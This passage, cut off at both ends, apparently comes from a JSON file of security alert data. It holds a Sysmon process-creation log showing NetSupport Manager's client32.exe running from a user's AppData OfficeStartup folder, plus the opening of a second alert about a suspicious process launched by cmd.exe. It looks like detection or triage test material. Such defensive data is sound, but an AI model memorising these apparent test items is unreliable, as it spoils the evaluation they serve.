Application\",\"EventID\":1,\"FileVersion\":\"V12.70\",\"Hashes\":\"MD5=877F5E83FB39DE16FA8BBD93BA9F07F1,SHA256=418744FA1ADE539C280461387DF87DDA6BF84C7D755EBBBDC6123FD5659F9467,IMPHASH=A9D50692E95B79723F3E76FCF70D023E\",\"Hostname\":\"wins-d19\",\"Image\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-081A-6482-DB4F-040000000000}\",\"LogonId\":\"0x44fdb\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"client32.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-081A-6482-8000-000000004A00}\",\"ParentProcessId\":\"4668\",\"ProcessGuid\":\"{C784477D-B0FA-648B-BC0A-000000004A00}\",\"ProcessID\":2240,\"ProcessId\":\"6156\",\"Product\":\"NetSupport Manager\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":749905,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":2996,\"User\":\"wins-d19\\\\lisawalker\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-11-26 05:34:54.000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "40": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activity2210231586.exe launched by cmd.exe",
        "ini_data": [
